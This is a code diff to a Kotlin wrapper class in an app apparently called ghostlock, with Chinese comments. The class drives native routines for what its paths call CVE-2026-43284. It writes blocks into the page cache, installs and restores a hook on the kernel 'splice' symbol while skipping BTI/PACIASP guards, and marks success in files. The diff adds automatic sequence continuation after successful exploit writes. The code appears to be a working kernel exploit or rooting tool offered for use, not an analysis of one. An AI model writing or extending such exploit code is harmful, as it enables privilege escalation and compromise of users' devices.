@@ -24,11 +24,16 @@ import com.ghostlock.app.core.generated.WriteBlock43284
  * 3. 缺 Access 线：makeAccess / accessInitialize / writeImageVerified / writeHook（现在靠 writeBlock 手写块代替）。
  *
  * @param handle [Native43284.create] 给的会话句柄；本类不负责创建，只负责用与收尾。
+ * @param sequence 会话间序号的自动接续（同一条 SA 上的所有窗口共用一个计数器）。
+ *        参照 ghostlock-app-ref@5f184760 的 src/core/backend/cve_2026_43284/real_ops.cpp:250-257 / 307-327 /
+ *        339-344 三处「自动交棒」：写成功后由 native 返回的序号推进，后续段直接取它，不再由调用方手传。
+ *        null = 这个会话不接续（只读/短会话）。
  * @param paramsProvider 每次要用会话参数时**现造一份**：native 的读取器在读完秘密字段后会把它清零
  *        （attack_contract_reader.hpp 的 clear<Group>Secrets），所以同一个 DTO 对象不能被复用两次。
  */
 class Assembled43284(
     private val handle: Long,
+    private val sequence: SequenceContinuation? = null,
     private val paramsProvider: (() -> Init43284)? = null,
 ) {
 
@@ -251,11 +256,13 @@ class Assembled43284(
      *  动态钩子计划（与 native 的 device_sentry_plan 同源）。
      *
      *  @param symbol 钩子符号（本构建只认 "splice"；native 只把它当输入校验）
-     *  @param guardPolicy guard 策略（当前 0）
+     *  @param guardPolicy guard 策略：默认 [GUARD_POLICY_SKIP]（**值仍是 0，行为不变**）。
+     *         依据 ghostlock-app-ref@5f184760 的 src/core/backend/cve_2026_43284/execution_binding.cpp:241：
+     *         生产路径显式用 Skip —— 本机 sentry 入口带 `bti c`，Reject 挂不上钩。
      *  @return 十个 long：branch、displaced、site、landing、hookVaddr、guard、payloadVaddr、
      *          payloadMax、entryOffset、displacedOffset（见 [Native43284.hookPlan]）；失败时 null。
      */
-    fun hookPlan(symbol: String, guardPolicy: Int = 0): LongArray? {
+    fun hookPlan(symbol: String, guardPolicy: Int = GUARD_POLICY_SKIP): LongArray? {
         val refusal = refusalSlot()
         val out = LongArray(10)
         val code = Native43284.hookPlan(
@@ -418,6 +425,33 @@ class Assembled43284(
         return code == 0
     }
 
+    /**
+     *  旁路读一次窗口的下一个序号：**不改** lastCode / lastRefusal。
+     *
+     *  @return 窗口的 next_seq；没有落地对象或查询失败时 0（调用方按「这次没拿到」处理）。
+     *  @note 写成 public 的 [nextSequence] 会 record() 一次，写成功之后的 code 就会被这次查询覆盖；
+     *        自动接续用的是这条旁路。
+     */
+    private fun peekSequence(): Long {
+        if (landingId == 0L) {
+            return 0L
+        }
+        val refusal = refusalSlot()
+        val out = LongArray(1)
+        val code = Native43284.nextSequence(handle, landingId, out, refusal)
+        return if (code == 0) out[0] else 0L
+    }
+
+    /**
+     *  写成功后的自动接续（ref real_ops.cpp:250-257 / 307-327 / 339-344 的「交回」）。
+     *
+     *  @note 没有 tracker 的会话（只读、或未接续）什么都不做 —— 不猜、不新建计数器。
+     */
+    private fun advanceSequence() {
+        val tracker = sequence ?: return
+        tracker.advance(peekSequence())
+    }
+
     /** 读窗口的下一个序号。 */
     fun nextSequence(): Long {
         val refusal = refusalSlot()
@@ -533,6 +567,10 @@ class Assembled43284(
         )
         val code = Native43284.writeImage(handle, params, request, init, refusal)
         record(code, refusal)
+        /* 写成功后自动接续（ref real_ops.cpp:307-327 的「交回」）：日志 seq: <prev> -> <next> (auto)。 */
+        if (code == 0) {
+            advanceSequence()
+        }
         return code == 0
     }
 
@@ -555,6 +593,10 @@ class Assembled43284(
         )
         val code = Native43284.writeHook(handle, params, request, init, refusal)
         record(code, refusal)
+        /* 同上：hook 窗口与载体共用一个计数器（ref real_ops.cpp:250-257 / 307-327）。 */
+        if (code == 0) {
+            advanceSequence()
+        }
         return code == 0
     }
 
@@ -592,6 +634,10 @@ class Assembled43284(
         )
         val code = Native43284.restoreHook(handle, params, request, plan, init, refusal)
         record(code, refusal)
+        /* 恢复写在同一 SA/套接字上 ⇒ 序号继续往前（ref real_ops.cpp:339-344）。 */
+        if (code == 0) {
+            advanceSequence()
+        }
         return code == 0
     }
 
@@ -664,8 +710,9 @@ class Assembled43284(
                 accessKernelModversions = false,
                 accessKernelModuleForceUnload = false,
                 accessHookPlanSet = false,
-                /* 参考 execution_binding.cpp:170 的默认值就是 500：孙进程要先睡一下，init 的收割路径才来得及走到被钩的 sentry。 */
-                accessTriggerDelayMs = 500L,
+                /* 参考 execution_binding.cpp:170 的默认值就是 500（唯一定义处见 TriggerSpec43284）：孙进程要先睡一下，
+                 * init 的收割路径才来得及走到被钩的 sentry。 */
+                accessTriggerDelayMs = TriggerSpec43284.DEFAULT_DELAY_MS,
                 accessWaitMs = 0L,
                 accessSuccessMarkerPath = (markerDir + "/ghostlock-success").toByteArray(),
                 accessFailureMarkerPath = (markerDir + "/ghostlock-failure").toByteArray(),
@@ -674,6 +721,19 @@ class Assembled43284(
             )
         /** 一块十六字节（AES-CBC 一块，也是页缓存写的宽度）。 */
         const val BLOCK = 16
+
+        /**
+         *  guard 策略：跳过站点前的 BTI/PACIASP 守卫（本机 sentry 入口带 `bti c`）。
+         *
+         *  参照 ghostlock-app-ref@5f184760 的 src/core/backend/cve_2026_43284/execution_binding.cpp:241：
+         *  生产路径显式用 `steps::HookGuardPolicy::Skip`（Reject 在本机根本挂不上钩 ⇒ HookFailed）。
+         *  值沿用既有 wire 口径 0（**行为不变**）；这一批只给它一个名字，免得下次再靠猜 0 是什么。
+         */
+        const val GUARD_POLICY_SKIP = 0
+
+        /** guard 策略的具名形态（只用于日志；未知值原样带出，不猜）。 */
+        fun guardPolicyName(policy: Int): String =
+            if (policy == GUARD_POLICY_SKIP) "Skip" else "policy-" + policy
 
         /** 目标角色（与契约里 ResolveTarget43284.role 的取值一致）。 */
         const val ROLE_PATCH1 = 1
